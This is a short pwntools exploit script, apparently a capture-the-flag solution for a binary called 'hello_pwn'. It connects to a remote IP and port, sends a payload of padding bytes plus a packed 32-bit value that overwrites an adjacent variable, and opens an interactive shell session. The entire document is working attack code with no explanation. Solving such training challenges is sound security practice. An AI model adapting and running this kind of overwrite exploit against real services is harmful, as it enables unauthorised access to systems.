from pwn import * 
binary = ELF('./hello_pwn')
#p = process('./hello_pwn')
p = remote( '220.249.52.133',52090)

#p.interactive()
p.recvline()
p.recvline()
payload = b"a"*4 +  p32(0x6e756161)
p.sendline(payload)
p.interactive()

